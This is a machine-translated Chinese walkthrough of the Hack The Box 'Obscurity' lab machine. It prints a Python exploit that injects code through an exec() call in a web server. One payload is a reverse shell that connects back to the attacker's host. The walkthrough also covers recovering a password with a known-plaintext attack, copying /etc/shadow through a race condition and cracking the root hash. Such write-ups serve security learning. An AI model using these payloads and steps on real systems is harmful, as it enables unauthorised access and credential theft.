# [HTB]默默无闻——记

> 原文：<https://infosecwriteups.com/htb-obscurity-write-up-bc65f61cd255?source=collection_archive---------0----------------------->

![](img/2874998624b666951de6edb320c2ef1e.png)

欢迎来到淫秽报道！这是一个中等难度的 Linux 盒子，要求玩家在基于 python 的 web 服务器中找到一个缺陷，以获得初始访问权。一旦我们获得了反向 shell 的初始访问权，那么，我们将需要分析另一个加密密码的 python 脚本。然后，我们可以进行已知明文攻击(“KPA”)来恢复第二个用户的密码。最后，对于 root 访问，我们可以滥用现有 BetterSSH.py 脚本上的竞争条件来读取`/etc/shadow`文件并破解“root”用户的密码。非常有趣的盒子，让我们开始吧！

![](img/12bf8ab3a8ad5b6ab0d3525cd4301f1b.png)

# 侦察

_________________________________________________________________

# Nmap

让我们从使用以下命令进行初始端口扫描开始:

```
$ nmap -Pn — open -sC -sV -p- -T4 10.10.10.168
```

![](img/f8fab29f1bb5279a83618e45c1098f62.png)

## 值得注意的有趣端口:

*   **HTTP (8080/TCP)** —盒子上只开放感兴趣的端口。很明显，这将是某种类型的网络相关的挑战，以获得最初的访问。当我们访问 url (http://10.10.10.168:8080)时，我们会看到以下内容:

![](img/e2e814bf5f9997cea3c6d73920c7cc89.png)

我们可以读到这个网站的一些意图/格言:

![](img/b694ca60852024e2e09578e13a1ad24f.png)

但是有一个有趣的内容是下面的。它表明我们可以在一个秘密目录中看到当前的 web 服务器源代码(“SuperSecureServer.py”):

![](img/b0655ac9a36b7a241d67dc1c5f87044b.png)

## 网络目录模糊化

知道了这一点，让我们开始模糊化 web 目录，以便找到“SuperSecureServer.py”可能位于何处。我使用了名为 [ffuf](https://github.com/ffuf/ffuf) 的网络模糊器。(是用 Go 写的，超级快。我们也可以很容易地定制像打嗝模糊点。)

![](img/f19f917b852c1868ef17bdddf3e7d31e.png)

当我们进入`/develop/SuperSecureServer.py`时，我们可以看到 web 服务器的源代码。

![](img/c5a2b17d84b9f0483119389385a87073.png)

# 初始立足点+用户访问#1 (www-data)

_________________________________________________________________

## 源代码分析

当我们对 python 代码进行快速静态分析时，我们可以在以下位置发现一个可疑的“exec()”函数。

![](img/f30d88d2bddf71b82defd7c1bc3507e5.png)

使用“exec()”，我们可以执行 python 系统调用来执行系统命令:

```
**### Example Usage of exec()**
# python
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
>>> import os
>>> exec(os.system("whoami"))
root
```

**网络服务器上的远程代码执行(RCE)**

为了理解执行 python 代码的正确语法，我们可以创建上述易受攻击代码的简化版本进行测试:

```
**[exploit.py] - Local RCE Attempt**import os
import urllib.parsepath = **"""'; os.system("whoami");'"""** path = urllib.parse.unquote(path)
info = "output = 'Document: {}'"
exec(info.format(path))
```

当我们在本地机器上运行 exploit.py 时，我们得到以下输出:

![](img/8ee0c0bf80f541d47314dbe57f598568.png)

很好。让我们更新我们的脚本，看看我们能否在盒子上做一个 RCE。

```
**[exploit.py] - Remote "Ping" Command Attempt**import os
import urllib.parse
import requestsurl = '[http://10.10.10.168:8080/'](http://10.10.10.168:8080/')path = **"""'; os.system("ping -c 1 10.10.14.39");'"""**# URL Encode Mode
path = urllib.parse.unquote(path)
#info = "output = 'Document: {}'"
#exec(info.format(path))r = requests.get(url + path)print(r.status_code)
print(r.headers)
print(r.text)
```

当我们运行 exploit.py 时，我们可以在机器上确认成功的 RCE。

![](img/7660a61357750593d821164074ba2790.png)

## 反向外壳

使用来自 [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 的 python 反向 shell 一行程序，我们可以更新 exploit.py。

```
**[exploit.py] - Python Reverse Shell**import os
import urllib.parse
import requestsurl = '[http://10.10.10.168:8080/'](http://10.10.10.168:8080/')path = **"""'; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.39",8055));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""**# URL Encode Mode
path = urllib.parse.unquote(path)
#info = "output = 'Document: {}'"
#exec(info.format(path))r = requests.get(url + path)print(r.status_code)
print(r.headers)
print(r.text)
```

当我们运行 exploit.py 时，我们将成功获得作为“www-data”用户的反向 shell。

![](img/1552293dc006e20d84b3c83177450db3.png)

# 用户访问#2(罗伯特)

_________________________________________________________________

为了升级到另一个用户(“robert”)，我们需要解决另一个 python 脚本挑战。我们可以在“罗伯特”的主目录中看到几个有趣的文件。

![](img/606fb74bae6c4c3b5c2818273675e126.png)

*   **SuperSecureCrypt.py** :这是一个用于加密/解密文件的脚本。

![](img/83b9d79c736407f085c3ad410999c817.png)

“SuperSecureCrypt.py”脚本的第一部分

*   **check . txt**:ASCII 文本文件。这份文件说:

```
check.txt + key ----[Encrypt]----> out.txt
```

![](img/b87ada541b8819e36994b20b4b9349f7.png)

*   **out.txt** :这是一个 UTF 8 Unicode 文本。这是加密的 check.txt 文件的输出文件。

![](img/5f70bf12d3a1f182ae723eefbd65296e.png)

*   **passwordreminder.txt** :也是 UTF 8 Unicode 文本。假设这是某种类型的密码文件，我们需要一个有效的密钥来解密它。

![](img/a4ebab54d8f0439251415de55a114c68.png)

## 已知明文攻击(“KPA”)

所以在 check.txt 和 out.txt 文件之间，我们知道明文和加密文件，但不知道密钥。然而，由于我们有加密文件的明文+源代码，我们可以做一个 KPA 来检索密钥。

python 加密/解密脚本已经给了我们，我们可以看到它的帮助页面:

![](img/d5439bd265d44fafbfeed018753edcdb.png)

这是不言自明的。为了得到一把钥匙，让我们供给

```
**### KPA Attack**
$ python3 SuperSecureCrypt.py -i out.txt -o /dev/shm/key.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -d-i = out.txt                       **# File that we want to decrypt**
-k = plaintext from check.txt      **# Supplying the plaintext as key** 
-o = key.txt                       **# Output for the key**
-d                                 **# Decrypt mode**
```

![](img/06eb99b6d5cdea0fb0eefc1a4ff630af.png)

当我们打开 key.txt 文件时，我们可以看到 key = alexandrovich。(似乎每个角色都在重复)

```
$ cat /dev/shm/key.txt
**alexandrovich**alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
```

![](img/0d87549798f6dd871bc9a4ec8eaef55b.png)

有了这个密钥，我们现在可以解密 passwordreminder.txt 文件，以获得“robert”用户的明文密码。

```
**### Getting robert's Password**
$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /dev/shm/robert_pw.txt -k 'alexandrovich' -d 
```

![](img/685c65f594b8ba51a231d67d7aa780ac.png)

## user.txt

有了这个密码，我们现在可以作为“robert”用户登录并读取`user.txt`文件。(我们也可以将 SSH 与“robert”用户凭证一起使用。)

![](img/7a3e56f55edd49d02eba458751159790.png)

# 根访问

_________________________________________________________________

我们可能要检查的第一件事是“robert”用户是否可以执行任何`sudo`操作。并且，它发现用户可以做`sudo`来运行 BetterSSH.py 脚本。看起来这将是另一个 python 挑战。(就像 pythonPythonPYTHON :P)

![](img/932835981ca3f330c0145cdcb777e801.png)

## 路径#1 —竞争条件利用

从 python 脚本中我们可以发现，它读取`/etc/shadow`文件来检查输入的用户密码。但它实际上是将`/etc/shadow`写入`/tmp/SSH/<Some Random Gibberish>`文件→休眠 0.1 段→然后将其删除。我们可以做一个竞态条件，在文件被删除之前复制它。

![](img/2027c45f6cb4c8e731b1e1820936926c.png)

为了利用这一点，我们可以创建一个简单的无限循环，将所有内容从`/tmp/SSH`复制到“robert”用户可以访问和阅读的其他地方。在运行时，我们将运行`sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py`命令将`/etc/shadow`文件写入`/tmp`目录。

```
$ cat /tmp/copy.sh 
#!/bin/bashmkdir = '/tmp/SSH'while true
do
        cp /tmp/SSH/* /dev/shm/
done
```

![](img/eb6494a4636067e4c17ef87754ec8287.png)

一旦通过身份验证，我们就可以检查`/dev/shm`并看到复制的`/etc/shadow`文件和“根”密码散列。

![](img/d09e984416eafa2e3d9830cd7b88575f.png)

用 rockyou.txt 单词表把散列输入 John。这将破解“root”用户密码=“奔驰。”

![](img/ed822436d23b54241b58f056f5167b32.png)

## root.txt

有了这个密码，我们可以`su — root`将我们的权限提升到“root”用户，并读取`root.txt`文件。

![](img/777f682b886e76c33e4f08097e50e33c.png)

## 路径#2 — Sudo 用户覆盖漏洞

仍然利用 BetterSSH.py 脚本，我们可以进行另一次权限提升。一旦通过验证，它就开始一个`while True:`循环来打开另一个 cmd shell。

![](img/e6ca4cf133f97a4884b320d703a52236.png)

这可能会被滥用，因为 Linux 倾向于优先使用最后提供的参数。举个例子，

```
_____Hidden_____|_______Display________
(sudo -u robert) $ id                     **# Takes robert**
(sudo -u robert) $ -u root id             **# Takes root**
(sudo -u robert) $ -u root -u robert id   **# Takes robert**
```

![](img/0d5fd4486b097c29e4ce9ca4603f63c4.png)

这样，我们也可以简单地对`root.txt`文件进行 cat。

![](img/f2d7cb3c457b546c979194178b19ce4f.png)

# 结论

_________________________________________________________________

这真的很有趣，box 进行了大量的代码审查，并利用了代码中易受攻击的函数。它相当 python 化，但是我们不都喜欢用 python 做任何事情吗？:)老实说，做淫秽盒子真的是一次有趣的旅程。

希望你喜欢我的文章，感谢你的阅读！

![](img/9113fe543c9439651bddeac55b3086e4.png)